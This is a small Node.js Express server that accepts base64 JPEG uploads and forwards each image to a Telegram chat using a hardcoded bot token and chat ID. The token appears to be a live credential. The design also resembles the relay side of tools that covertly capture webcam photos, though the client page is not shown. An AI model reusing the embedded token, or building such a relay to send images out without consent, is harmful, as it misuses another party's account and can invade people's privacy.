const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const PORT = 3000;
const BOT_TOKEN = '7391339726:AAGvGFhkxLmdLS1irRMTMnzUnNHBHskXZMY';
const CHAT_ID = '1174153911';

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public')); // Serve static files from the 'public' directory

app.post('/upload', async (req, res) => {
    const { image } = req.body;

    // Decode the base64 image and save it as a file
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = 'image.jpg';
    fs.writeFileSync(filePath, base64Data, 'base64');

    // Prepare the image for sending to Telegram
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', fs.createReadStream(filePath));

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders()
            }
        });
        console.log('Image sent successfully:', response.data);
        res.json({ status: 'success' });
    } catch (error) {
        console.error('Error sending image:', error);
        res.status(500).json({ status: 'error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
